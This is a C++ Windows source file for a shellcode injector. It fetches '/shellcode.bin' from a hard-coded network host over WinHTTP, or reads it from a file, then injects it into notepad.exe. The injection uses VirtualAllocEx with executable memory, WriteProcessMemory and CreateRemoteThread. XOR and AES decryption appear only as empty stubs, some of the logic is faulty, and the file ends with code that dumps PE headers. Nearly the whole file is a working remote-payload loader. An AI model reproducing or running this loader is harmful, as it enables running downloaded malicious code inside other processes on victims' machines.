#include <iostream>
#include<windows.h>
#include <stdlib.h>
#include<string>
#include<openssl/md5.h>
#include<winhttp.h>
#include<TlHelp32.h>
#include<Psapi.h>

#pragma comment(lib, "winhttp.lib")
typedef std::string string;

struct download_struct {
    char* shellcode;
    int len;
    string password;
    string ip_address;
    int port;
    int encryption;
    int isFile;
    string location;
};

//string create_MD5(string input) {
//    unsigned char result[MD5_DIGEST_LENGTH];
//    MD5((unsigned char*)input.c_str(), input.size(), result);
//
//    string hash = "";
//    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
//        char x = result[i];
//        hash = hash + std::to_string(x);
//    }
//    return hash;
//}  

void read_file(download_struct &download) {
    FILE* f = fopen(download.location.c_str(),"r");
    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);

    char* shellcode = new char[size];

    rewind(f);
    fread(shellcode, sizeof(char), size, f);
    download.shellcode = shellcode;
}

LPSTR string_to_lpstr(string s) {
    LPSTR res = const_cast<char*>(s.c_str());
    return res;
}

LPCWSTR s2pw(const string s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	return buf;
}

void download_server(download_struct &download) {
    char* shellcode = NULL;
    HINTERNET hSession = WinHttpOpen(L"Injector v1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = NULL, hRequest=NULL;
    bool hResult;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;

    if (hSession) {
        LPCWSTR server = s2pw(download.ip_address);
        hConnect = WinHttpConnect(hSession, server, download.port, 0);
    }
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/shellcode.bin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_BYPASS_PROXY_CACHE);
    
    if (hRequest)
        hResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (hResult)
        hResult = WinHttpReceiveResponse(hRequest, NULL);
    
    if (hResult) {
        int runner = 0;
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            printf("[!] Error getting data from server");
        }
        if (dwSize == 0) {
            printf("[+] Empty response from server");
            return;
        }
        pszOutBuffer = new char[dwSize + 1];
        if (!pszOutBuffer) {
            printf("[!] Out of memory");
            dwSize = 0;
        }
        else {
            ZeroMemory(pszOutBuffer, dwSize);
			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,dwSize, &dwDownloaded))
				printf("Error %u in WinHttpReadData.\n", GetLastError());
            shellcode = (char*)malloc(dwSize*sizeof(char));
            download.shellcode = pszOutBuffer;
            download.len = dwSize;
        }
    }
    return;
}

void aes_decryption(string password,char* dec_shellcode) {
    string iv = "1234567891234567";

}

void xor_decryption(string key, char* dec_shellcode) {

}

void download_data(download_struct &download) {
    if (download.location.find(string("http")) or download.location.find(string("//"))) {
        download_server(download);
    }
    else {
        read_file(download);
    }
    if (download.encryption != 0) {
        if (download.encryption == 1) {
			char* dec_shellcode = (char*)malloc(download.len);
            xor_decryption(download.password, dec_shellcode);
            download.shellcode = dec_shellcode;
            return ;
        }
        else if (download.encryption == 2) {
			char* dec_shellcode = (char*)malloc(download.len);
            aes_decryption(download.password, dec_shellcode);
            download.shellcode = dec_shellcode;
            return ;
        }
    }
    return ;
}

int get_len_w(PWCHAR text) {
    int i = 0;
    while (text[i] != '\0') {
        i = i + 1;
    }
    return i;
}

char* convert_pwchar_str(PWCHAR text) {
    int len = get_len_w(text) + 1;
    char * res = (char*)malloc(len);
    wcstombs(res, text, get_len_w(text)+1);
    return res;
}

int get_process_id(string procname) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("[!] Error performing snapshot of process");
        return -1;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);

    while (Process32Next(hProcessSnap, &pe32) == TRUE) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pe32.th32ProcessID);
        if (hProcess) {
            char* name = convert_pwchar_str(pe32.szExeFile);
            if (_stricmp(name, procname.c_str())==0) {
                int pid = pe32.th32ProcessID;
                CloseHandle(hProcess);
                CloseHandle(hProcessSnap);
                return pid;
            }
            free(name);
            CloseHandle(hProcess);
        }
    }
	CloseHandle(hProcessSnap);
    return -1;
}

void process_injection(download_struct &download) {
    bool res = false;
    string process_name = "notepad.exe";
    int pid = get_process_id(process_name);
    if (pid == -1) {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
        if (CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi)) {
            pid = (int)pi.dwProcessId;
        }
        else {
            printf("[!] Error creating the process");
            return;
        }
    }
    download_data(download);
    size_t* len = (size_t*)malloc(sizeof(size_t));
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    LPVOID address = VirtualAllocEx(hProcess, NULL, download.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    res = WriteProcessMemory(hProcess, (CHAR*)address, download.shellcode, download.len, len);
    if (res == false) {
        printf("[!] Error writing shellcode into process");
        return;
    }
    LPVOID hthread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);
    return;
}

int main()
{
    // Declare the structure
    download_struct download;
    download.encryption = 0;
    download.ip_address = "192.168.122.1";
    download.port = 80;
    download.isFile = 0;
    download.location = download.ip_address + ":" + std::to_string(download.port);

    // Process Injection C++
    process_injection(download);

//    int pid = get_process_id("notepad.exe");
    printf("[!] Dissecting the PE executable\n");
    HMODULE base_addr = GetModuleHandleA(NULL); //Contains base address of current application.
    std::cout << "[+] Entry address of the .NET: " << base_addr << "\n";
    PIMAGE_DOS_HEADER dos = (IMAGE_DOS_HEADER*)base_addr;
    std::cout << "[+] e_lfanew value: " << dos->e_lfanew << "\n";
    PIMAGE_NT_HEADERS pheader = (IMAGE_NT_HEADERS*)(dos->e_lfanew + base_addr);
    std::cout << "[+] Address of PE header: " << dos->e_lfanew + base_addr << "\n";
    std::cout << "[+] Signature value in PE header: " << (DWORD)(pheader->Signature) << "\n";
    IMAGE_FILE_HEADER fheader = pheader->FileHeader;
    std::cout << "[+] File header address: " << &fheader << "\n";
    std::cout << "[+] Number of sections: " << (DWORD)fheader.NumberOfSections << "\n";
    IMAGE_OPTIONAL_HEADER opheader = pheader->OptionalHeader;
    std::cout << "[+] Address of EntryPoint: " << opheader.AddressOfEntryPoint << "\n";
    std::cout << "[+] Image base: " << opheader.ImageBase << "\n";
    
    // Import address table
    IMAGE_DATA_DIRECTORY iat = opheader.DataDirectory[1];
    DWORD iat_address = iat.VirtualAddress;
    DWORD iat_size = iat.Size;

    std::cout << "[+] IAT address: " << iat_address << "\n";
    std::cout << "[+] No of IAT entries: " << iat_size << "\n";
    std::cout << "Hello World!\n";
}
